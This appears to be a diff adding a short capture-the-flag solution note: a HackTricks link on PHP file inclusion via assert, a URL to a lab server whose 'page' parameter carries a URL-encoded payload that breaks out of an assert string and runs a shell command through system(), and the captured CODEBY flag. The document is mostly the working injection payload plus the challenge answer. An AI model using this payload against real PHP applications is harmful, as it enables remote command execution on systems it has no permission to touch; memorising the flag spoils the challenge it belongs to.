@@ -1,0 +1,5 @@
+https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert
+
+http://62.173.140.174:46005/?page=%27%20and%20die(system(%22cat%20help.txt%22))%20or%20%27
+
+CODEBY{php_lf1_t0_rc3_d0ne}
